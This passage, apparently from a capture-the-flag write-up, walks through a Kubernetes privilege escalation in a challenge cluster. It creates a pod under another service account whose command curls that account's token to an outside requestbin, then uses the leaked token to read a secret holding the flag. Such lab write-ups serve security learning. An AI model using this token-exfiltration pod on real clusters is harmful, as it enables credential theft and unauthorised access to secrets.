      lastTransitionTime: "2021-07-04T08:07:52Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:55Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:55Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2021-07-04T08:07:52Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: docker://f27e5366e70e1eba11b67280f329c4708726461fcef34f8a3c6750e0b36ad9c6
      image: ubuntu@sha256:aba80b77e27148d99c034a987e7da3a287ed455390352663418c0f2ed40417fe
      imageID: docker-pullable://ubuntu@sha256:aba80b77e27148d99c034a987e7da3a287ed455390352663418c0f2ed40417fe
      lastState: {}
      name: home
      ready: true
      restartCount: 0
      started: true
      state:
        running:
          startedAt: "2021-07-04T08:07:54Z"
    hostIP: 172.31.37.46
    phase: Running
    podIP: 172.17.0.7
    podIPs:
    - ip: 172.17.0.7
    qosClass: BestEffort
    startTime: "2021-07-04T08:07:52Z"
kind: List
metadata:
  resourceVersion: ""
  selfLink: ""
```
Indeed, we got a hint in the form of a link to the [CyberArk blog](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions).
The description told us that we need to move to the `alpha-centauri` namespace, let's see what we can do there:
```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods.*                                          []                                    []               [create get]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
serviceaccounts.*                               []                                    []               [list get]
podsecuritypolicies.*                           []                                    []               [use]
```
This is good news: Over there, we can create and get pods, list and get service accounts and use pod security policies. We'll start by reading the service accounts for `alpha-centauri`:
```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get serviceaccounts
NAME               SECRETS   AGE
alpha-centauri-a   1         14d
alpha-centauri-b   1         14d
default            1         19d
proxima            1         19d
```
The description told us we should be interested in `alpha-centauri-b`. As the blog post suggested, let's try to create a pod with the `alpha-centauri-b` service account in order to steal their token and possibly escalate privileges. We do that by leaking their token using a requestbin:
```console
[cyborg-1337@earth]# kubectl --token "${TOKEN}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri create -f-  apiVersion: v1
> kind: Pod
> metadata:
>   name: mypod
>   namespace: alpha-centauri
> spec:
>   containers:
>     - name: mypod
>       image: ubuntu
>       command: ["/bin/sh"]
>       args: ["-c","apt update && apt install -y curl; curl -X POST https://enx36dubz6vd.x.pipedream.net/ -d @/var/run/secrets/kubernetes.io/serviceaccount/token; sleep infinity"]
>   serviceAccountName: alpha-centauri-b
>   automountServiceAccountToken: true
> EOF
pod/mypod created
```
A few seconds later, we get a hit in our requestbin with the token:
```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbHBoYS1jZW50YXVyaSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhbHBoYS1jZW50YXVyaS1iLXRva2VuLXZ4djI4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFscGhhLWNlbnRhdXJpLWIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NzMxOTY4ZC1jYTZiLTQyNmYtYTZlNi1lM2ZlYTBjZGVmMmEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YWxwaGEtY2VudGF1cmk6YWxwaGEtY2VudGF1cmktYiJ9.ORxg24s9n23DZ2X651kV_vPH1WRkwDQnE2-1j14u2djpaD_Qz6chGO4MGH6uVnTKMn0xv7MA2N7NisHCm9_NzvUW7wKAKOWJEZ6o0yhaewKr8kNcqKdbmokOqJ5asFy_JHa671TF6WMOAmWTzY-2kbzX8ys9kCvkgG6cFhpYTAmmlM13sSnYDiXOa4X4juBwzNMJh-7KSMwwAAYOjKKTHyDdOHpw3N8mJMS7oCIpNdc9NMgCemokKhu6IXHUfa5szlDtUdQt7QYecwprrDn4fhzQiFo_l6Nt4LdTB9T2fmeY5FtGC1pyfAqotevvrRWO_FCVyfVcQlz7wSt60Wtuqg
```
We export it for convenience:
```console
[cyborg-1337@earth]# export TOKEN_ACB=eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZX
Rlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbHBoYS1jZW50YXVyaSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhbHBoYS1jZW50YXVyaS1iLXRva2VuLXZ4djI4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNj
b3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFscGhhLWNlbnRhdXJpLWIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NzMxOTY4ZC1jYTZiLTQyNmYtYTZlNi1lM2ZlYTBjZGVmMmEiLCJzdWIiOiJzeXN0ZW
06c2VydmljZWFjY291bnQ6YWxwaGEtY2VudGF1cmk6YWxwaGEtY2VudGF1cmktYiJ9.ORxg24s9n23DZ2X651kV_vPH1WRkwDQnE2-1j14u2djpaD_Qz6chGO4MGH6uVnTKMn0xv7MA2N7NisHCm9_NzvUW7wKAKOWJEZ6o0yhaewKr8kNcqKdbmokOqJ5asFy_JHa
671TF6WMOAmWTzY-2kbzX8ys9kCvkgG6cFhpYTAmmlM13sSnYDiXOa4X4juBwzNMJh-7KSMwwAAYOjKKTHyDdOHpw3N8mJMS7oCIpNdc9NMgCemokKhu6IXHUfa5szlDtUdQt7QYecwprrDn4fhzQiFo_l6Nt4LdTB9T2fmeY5FtGC1pyfAqotevvrRWO_FCVyfVcQ
lz7wSt60Wtuqg
```
Now let's check what they (we) can do:
```console
[cyborg-1337@earth]# kubectl --token "${TOKEN_ACB}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
secrets.*                                       []                                    []               [list get]
```
We can list secrets!
Let's check the secrets:
```console
[cyborg-1337@earth]# kubectl --token "${TOKEN_ACB}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get secrets
NAME                           TYPE                                  DATA   AGE
alpha-centauri-a-token-lvgsq   kubernetes.io/service-account-token   3      14d
alpha-centauri-b-token-vxv28   kubernetes.io/service-account-token   3      14d
centauri1337                   Opaque                                1      19d
default-token-2rjmf            kubernetes.io/service-account-token   3      19d
proxima-token-nwpj4            kubernetes.io/service-account-token   3      19d
```
The description pointed us to `centauri1337`:
```console
[cyborg-1337@earth]# kubectl --token "${TOKEN_ACB}" --server="${APISERVER}" --insecure-skip-tls-verify=true --namespace=alpha-centauri get secrets centauri1337 -o yaml
apiVersion: v1
data:
  flag: Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo="},"kind":"Secret","metadata":{"annotations":{},"name":"centauri1337","namespace":"alpha-centauri"}}
  creationTimestamp: "2021-06-29T07:24:23Z"
  name: centauri1337
  namespace: alpha-centauri
  resourceVersion: "458843"
  uid: 50542046-a97d-4473-aaec-4aff03b22388
type: Opaque
```
We got the flag:
```console
[cyborg-1337@earth]# echo Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo= | base64 -d
CYBR{a1Pha_c3n7aur1_1s_y0ur_n3w_h0m3}
```